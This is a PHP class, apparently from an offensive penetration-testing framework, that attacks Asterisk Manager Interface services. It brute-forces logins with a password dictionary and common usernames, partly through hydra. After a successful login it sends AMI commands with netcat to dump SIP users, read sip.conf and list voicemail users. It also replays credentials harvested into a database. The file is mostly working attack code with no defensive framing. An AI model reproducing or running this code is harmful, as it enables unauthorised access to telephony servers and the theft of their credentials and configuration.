<?php


class service2asterisk extends check4linux {


    public function __construct($eth,$domain,$ip,$port,$service_protocol) {
        parent::__construct($eth,$domain,$ip,$port,$service_protocol);
    }



public function service2asterisk2auth($stream,$user2name){
    $result = "";
    $result .= $this->ssTitre(__FUNCTION__);
    $users_pass = file("$this->dico_password.1000");
    foreach ($users_pass as $user2pass){
        $user2pass = trim($user2pass);
        $check = $this->auth2login_asterisk($user2name,$user2pass);
        if ($check==TRUE) {
            $result .= $this->yesAUTH($this->ip, $this->port2id, $user2name, $user2pass, '','','','','',".__FUNCTION__.",$this->ip2geoip());
            $result .= $this->ssTitre("Display All Users");
            $query = "echo 'action: login\r\nusername: $user2name\r\nsecret: $user2pass\r\n\r\naction: command\r\ncommand: sip show users\r\n' | nc $this->ip $this->port -v -w3 -n ";
            $result .= $this->cmd("localhost",$query);
            $result .= $this->req_ret_str($query);
            $query = "echo 'action: login\r\nusername: $user2name\r\nsecret: $user2pass\r\n\r\naction: GetConfig\r\nFilename: sip.conf\r\n' | nc $this->ip $this->port -v -w3 -n ";
            $result .= $this->cmd("localhost",$query);
            $result .= $this->req_ret_str($query);
            $result .= $this->note("locate voicemail users");
            $query = "echo 'action: login\r\nusername: $user2name\r\nsecret: $user2pass\r\n\r\naction: voicemailuserslist\r\n' | nc $this->ip $this->port -v -w3 -n  ";
            $result .= $this->cmd("localhost",$query);
            $result .= $this->req_ret_str($query); //  | grep -E -i \"(Voicemailbox|fullname)\"
            $result .= $this->ssTitre("ListCommands");
            $query = "echo 'action: login\r\nusername: $user2name\r\nsecret: $user2pass\r\n\r\naction: voicemailuserslist\r\n' | nc $this->ip $this->port -v -w3 -n  | grep -E \"(VoiceMailbox|Fullname)\"";
            $result .= $this->cmd("localhost",$query);
            $result .= $this->req_ret_str($query);
        }
    }
    return $result;
}


public function service2asterisk4exec($stream){
    $result = "";

        $result .= $this->ssTitre(__FUNCTION__);
        
        $users_test = array("root","admin","administrator","guest","user","test","voip");
        foreach ($users_test as $user_test){
            $result .= $this->port2auth4dico4hydra("asterisk",$user_test);
            $result .=  $this->service2asterisk2auth($stream,$user_test);
        }
        
        
        
        
        $sql_r = "select user2name,user2pass FROM AUTH where ip='$this->ip' ORDER BY user2name;";
        $conn = $this->mysql_ressource->query($sql_r);
        while ($row = $conn->fetch_assoc()){
            $user2name = trim($row['user2name']);
            $user2pass = trim($row['user2pass']);
            $result .= $this->article("USER/PASS FOUND FOR TEST", "$user2name/$user2pass");
            if (!empty($user2name)) $result .= $this->port2auth4pass4hydra("asterisk", $user2name, $user2pass);
        }
        
        return $result;
}



  }
?>
